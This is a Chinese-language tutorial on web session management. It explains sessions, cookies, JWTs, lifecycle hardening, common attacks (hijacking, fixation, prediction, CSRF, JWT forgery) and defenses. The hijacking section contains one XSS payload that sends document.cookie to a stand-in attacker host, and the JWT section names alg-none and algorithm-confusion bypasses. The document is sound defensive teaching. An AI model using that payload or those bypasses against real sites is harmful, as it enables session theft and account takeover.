# 会话管理

了解会话管理，以及针对不安全实现可能实施的各种攻击方法。

## 1. 什么是会话管理

### 一、什么是会话（Session）

**会话**（Session）是服务器为**某个用户**在一段连续时间内维护的一组状态信息。它通常以**会话标识符**（Session ID）为核心：用户登录后，服务器创建一个会话并分配唯一的 Session ID，之后用户每次请求都携带这个 ID，服务器就能认出"这是已登录的用户张三"，无需用户反复输入密码。

**一句话概括：** 会话让"无状态"的 HTTP 协议变"有状态"——记住每个用户是谁、处于什么状态。

### 二、为什么需要会话管理

HTTP 是**无状态**（Stateless）协议，每次请求之间相互独立，服务器不记得上一个请求是谁发出的。但真实业务离不开状态：

- 登录一次后，后续访问都保持已登录；
- 购物车内容跨页面保留；
- 权限、个性化偏好等设置跟随用户。

如果每个请求都要重新认证，体验无法接受。**会话管理**就是解决"如何安全地维持用户状态"的机制。

### 三、会话管理的组成

一个完整的会话管理包含以下环节：

| 环节 | 说明 |
| --- | --- |
| 会话创建 | 用户登录/首次访问时，生成会话并分配 Session ID |
| 会话传输 | 通过 Cookie、请求头或 URL 参数把 Session ID 传给服务器 |
| 会话存储 | 会话数据存在服务端（内存、数据库、缓存）或客户端 |
| 会话验证 | 服务器校验每次请求携带的 Session ID 是否有效 |
| 会话销毁 | 登出、超时、被替换时安全地结束会话 |

### 四、会话标识符（Session ID）

Session ID 是会话管理的核心资产，它必须满足：

1. **足够随机**：不可预测，防止攻击者猜中他人会话。
2. **足够长**：抵抗暴力枚举（通常应具备 128 bit 以上的熵）。
3. **定期更换**：登录成功、权限变化时应重新生成（防会话固定）。
4. **不可泄露**：只通过安全通道传输，不暴露在 URL 中。

**核心成因：** 大量会话漏洞的本质都是 **Session ID 被窃取、被预测或被固定**——拿到它就能冒充该用户。

## 2. 认证和授权

### 一、认证（Authentication）

**认证**解决"你是谁"的问题——验证用户身份。常见方式：

- 密码（用户名 + 密码）；
- 多因素认证（MFA）：短信/应用验证码、硬件密钥；
- 生物特征：指纹、人脸；
- 第三方登录：OAuth、OIDC。

认证成功后，系统建立会话，用户获得"已认证"的状态。

### 二、授权（Authorization）

**授权**解决"你能干什么"的问题——验证用户是否有权执行某个操作或访问某个资源。授权基于角色、权限、对象归属关系进行判断：

- 普通用户 vs 管理员（垂直授权）；
- 用户 A 能否访问用户 B 的数据（水平授权）。

### 三、认证与授权的区别

| 对比项 | 认证（Authentication） | 授权（Authorization） |
| --- | --- | --- |
| 回答的问题 | 你是谁？ | 你能做什么？ |
| 时机 | 登录时 | 每次访问受保护资源时 |
| 失败的表现 | 登录失败 | 403 / 越权 |
| 关联 | 确认身份 | 基于身份判断权限 |

**关键点：** 认证通过不等于授权通过。很多漏洞（如 IDOR）正是"认证没问题，但授权检查缺失"。

### 四、会话在认证授权中的作用

- 认证成功 → 创建会话 → 会话携带用户身份 → 每次请求据此做授权判断。
- 会话被窃取 = 攻击者获得该用户的**全部权限**（认证与授权一并沦陷）。
- 会话管理是否安全，直接决定认证授权体系的可靠性。

## 3. Cookies 和 Tokens

### 一、Cookie 机制

Cookie 是服务器通过 `Set-Cookie` 响应头发给浏览器的一小段文本，浏览器在后续请求中通过 `Cookie` 请求头自动带回：

```http
# 服务器响应
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax

# 浏览器后续请求
Cookie: session=abc123
```

**会话 Cookie**：`session=abc123` 这类 Cookie 就是 Session ID 的载体。

### 二、Cookie 的安全属性

| 属性 | 作用 | 缺失时的风险 |
| --- | --- | --- |
| `HttpOnly` | 禁止 JavaScript 读取 Cookie | XSS 可直接窃取 Session ID |
| `Secure` | 仅通过 HTTPS 传输 | 明文 HTTP 下被中间人截获 |
| `SameSite` | 限制跨站请求携带（Strict/Lax/None） | CSRF 攻击 |
| `Domain` / `Path` | 限制 Cookie 的作用范围 | 子域/路径越界泄露 |
| `Expires` / `Max-Age` | 过期时间 | 会话长期有效，泄露面扩大 |

**一句话概括：** 会话 Cookie 的安全，取决于这些属性是否配置到位。

### 三、Token 机制

Token 是一种**不依赖服务端会话存储**的凭证，服务器签发一段"令牌"，客户端在请求头中携带：

```http
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...
```

最常见的 Token 是 **JWT**（JSON Web Token），结构为 `Header.Payload.Signature`：

- **Header**：算法与类型；
- **Payload**：携带的用户信息、过期时间（`exp`）等；
- **Signature**：用密钥对前两部分签名，防止篡改。

JWT 的常见问题点：

1. 签名密钥若被泄露或太弱（如 `secret`、`123456`），攻击者可**伪造任意身份**；
2. 算法混淆攻击（`alg: none`、`RS256 → HS256`）可绕过签名校验；
3. Token 一旦签发，在过期前难以吊销（无状态特性）。

### 四、Cookie 与 Token 对比

| 对比项 | Cookie 会话 | Token（JWT） |
| --- | --- | --- |
| 存储位置 | 服务端会话数据 + 客户端 Cookie | 客户端持有，服务端验签 |
| 状态性 | 有状态 | 无状态 |
| 传输方式 | Cookie 请求头自动携带 | Authorization 请求头显式携带 |
| 吊销能力 | 删除服务端会话即可 | 过期前难以撤销（需黑名单） |
| 主要风险 | 被 XSS / CSRF / 嗅探利用 | 密钥泄露、算法混淆、过期难控 |

## 4. 保护会话生命周期（Securing the Session Lifecycle）

### 一、会话生命周期

一个会话从创建到销毁，主要经历 **创建 → 传输 → 使用 → 销毁** 四个阶段，每个阶段都有对应的攻击面与防护要点。

### 二、创建阶段

- 使用**加密安全的随机数生成器**（CSPRNG）生成 Session ID，禁止用可预测的时间戳、递增数字；
- 登录成功后**更换 Session ID**（防会话固定）；
- 会话 ID 不放 URL 参数中（易被日志、Referer、浏览器历史泄露）。

### 三、传输阶段

- 全站 HTTPS，会话 Cookie 标记 `Secure`；
- Cookie 标记 `HttpOnly`，阻断 XSS 窃取；
- 不在 Cookie 中保存敏感数据本身，只存会话引用。

### 四、使用阶段

- 服务器侧**验证会话有效性**：是否过期、来源是否异常、权限是否变化；
- 高权限操作设置**二次认证**（如改密、转账）；
- 检测并处理会话固定、异常并发会话。

### 五、销毁阶段

- 登出时**服务端销毁会话** + 客户端删除 Cookie（双端清理）；
- 设置合理的**空闲超时**（不活跃自动失效）与**绝对超时**（最长登录时长）；
- 修改密码、检测到暴力破解时，强制**使所有会话失效**。

### 六、会话固定（Session Fixation）

**会话固定**是一种特殊攻击：攻击者**先给受害者一个已知的 Session ID**，诱导受害者带着这个 ID 登录，成功后攻击者就能用同一个 ID 冒充受害者：

```text
1. 攻击者获取/生成一个 Session ID（如访问站点得到 sid=abc）
2. 诱导受害者带着 sid=abc 去登录（钓鱼链接 / 预置 Cookie）
3. 受害者登录成功，服务器把这个 ID 标记为已认证
4. 攻击者用 sid=abc 直接冒充受害者
```

**防护：** 登录成功后**重新生成 Session ID**，不沿用登录前的 ID，即可从根本上杜绝会话固定。

## 5. 针对不安全会话管理的攻击

### 一、会话劫持（Session Hijacking）

攻击者**窃取合法用户的 Session ID** 后冒充该用户访问系统。常见窃取途径：

- **XSS**：注入脚本读取 Cookie（`HttpOnly` 可阻断）；
- **网络嗅探**：明文 HTTP 下截获 Cookie（`Secure` + HTTPS 可阻断）；
- **日志 / 历史记录**：Session ID 出现在 URL 中时被记录；
- **中间人攻击**：抓包、篡改代理。

```javascript
// XSS 窃取未设 HttpOnly 的 Cookie
<script>fetch('http://attacker.com/?c='+document.cookie)</script>
```

**防护：** `HttpOnly` + `Secure` + HTTPS + 异常会话检测。

### 二、会话固定（Session Fixation）

如上一章所述，攻击者固定受害者的 Session ID 后等其登录。**核心成因**是服务器没有在认证成功后更换 Session ID。

### 三、会话预测（Session Prediction）

若 Session ID 由**可预测的元素**生成（时间戳、递增数字、弱随机算法），攻击者可推算或枚举出他人的有效会话：

```text
# 可预测的 ID 模式
session=1001, session=1002, session=1003 ...
```

**防护：** 使用 CSPRNG 生成高熵随机 ID，并用短超时、IP 限速限制暴力枚举。

### 四、Cookie 属性配置不当

- 未设 `HttpOnly` → XSS 直接读取 Cookie；
- 未设 `Secure` → 明文 HTTP 泄露；
- 未设 `SameSite` → CSRF；
- `Domain` 过宽 → 子域沦陷导致主域 Cookie 泄露。

### 五、跨站请求伪造（CSRF）

CSRF 利用**会话 Cookie 自动携带**的特性：受害者已登录时，攻击者诱导其浏览器发起伪造请求，浏览器自动带上会话 Cookie，服务器误以为是本人操作。详见本分类下的《CSRF介绍》。

**防护：** CSRF Token、`SameSite` 属性、校验来源（Origin/Referer）。

### 六、JWT / Token 的安全风险

- **弱密钥**：爆破出签名密钥后可伪造任意用户的 Token；
- **算法混淆**：把 `RS256` 改成 `HS256` 并用公钥当 HMAC 密钥，可绕过校验；
- **`alg: none`**：部分实现允许无签名 Token；
- **Payload 篡改**：若服务端信任未校验的字段，可伪造 `admin: true` 之类信息。

## 6. 会话管理防护措施

1. **高强度随机 Session ID**：用 CSPRNG 生成高熵 ID，禁止可预测序列。
2. **登录后更换 ID**：认证成功即重新生成会话 ID，杜绝会话固定。
3. **Cookie 属性全配齐**：`HttpOnly` + `Secure` + `SameSite` + 精确的 `Domain`/`Path` + 合理过期时间。
4. **全站 HTTPS**：会话数据只走加密通道。
5. **服务端会话控制**：空闲超时、绝对超时、登出双端销毁、异常会话检测。
6. **敏感操作二次认证**：改密、支付等高风险动作要求重新验证身份。
7. **Token 加固**：使用强密钥、固定并校验签名算法、设置 `exp` 过期、维护吊销/黑名单机制。
8. **纵深防御**：配合 CSP（内容安全策略）、HSTS、安全日志与监控。

**判断特征：** 评估一套会话管理是否安全，就看四件事——**ID 生成是否随机、传输与存储是否加密、认证后是否更换、销毁是否彻底**。任一环失守，都可能被上述攻击利用。

## 7. 会话管理安全总结

| 攻击类型 | 成因 | 关键防护 |
| --- | --- | --- |
| 会话劫持 | Session ID 被窃取 | HttpOnly + HTTPS + 异常检测 |
| 会话固定 | 认证后未更换 ID | 登录成功重新生成 ID |
| 会话预测 | ID 熵不足/可预测 | CSPRNG 高熵随机 ID |
| CSRF | 浏览器自动携带 Cookie | SameSite + CSRF Token |
| Cookie 泄露 | 属性配置不当 | Secure / HttpOnly / Domain 精确 |
| JWT 伪造 | 弱密钥/算法混淆 | 强密钥 + 固定算法 + 严格验签 |

**总结：** 会话管理是 Web 认证体系的地基——**"身份"全部押在 Session ID / Token 上**，它一旦被窃取、预测、固定或伪造，等于身份被冒用。测试与审计时，围绕"ID 从哪来、怎么传、怎么存、怎么销毁"四步检查，即可覆盖绝大多数会话类漏洞。
